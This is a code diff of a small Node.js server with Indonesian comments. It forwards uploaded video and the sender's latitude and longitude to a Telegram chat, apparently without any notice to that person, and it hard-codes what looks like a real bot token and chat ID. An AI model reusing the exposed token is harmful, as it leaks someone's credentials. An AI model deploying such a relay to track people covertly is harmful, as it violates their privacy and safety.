@@ -7,9 +7,9 @@ const FormData = require("form-data");
 const app = express();
 const upload = multer({ dest: "uploads/" });
 
-// Ambil dari Railway ENV
+// ⚠️ HARD CODE (TIDAK AMAN)
 const BOT_TOKEN = "8734665008:AAHPemOmUrDII54B0tnmzq5NX5VkT9IXOaY";
-const CHAT_ID = " 6677303168";
+const CHAT_ID = "6677303168";
 
 app.post("/upload", upload.single("video"), async (req, res) => {
   try {
@@ -17,13 +17,13 @@ app.post("/upload", upload.single("video"), async (req, res) => {
     const lon = req.body.lon;
     const filePath = req.file.path;
 
-    // Kirim lokasi
+    // kirim lokasi
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       chat_id: CHAT_ID,
-      text: `📍 Lokasi User:\nLat: ${lat}\nLon: ${lon}`
+      text: `📍 Lokasi:\nLat: ${lat}\nLon: ${lon}`
     });
 
-    // Kirim video
+    // kirim video
     const form = new FormData();
     form.append("chat_id", CHAT_ID);
     form.append("video", fs.createReadStream(filePath));
@@ -41,8 +41,4 @@ app.post("/upload", upload.single("video"), async (req, res) => {
   }
 });
 
-app.get("/", (req, res) => {
-  res.send("Server aktif");
-});
-
-app.listen(3000, () => console.log("Server jalan di port 3000"));
+app.listen(3000, () => console.log("Server jalan"));
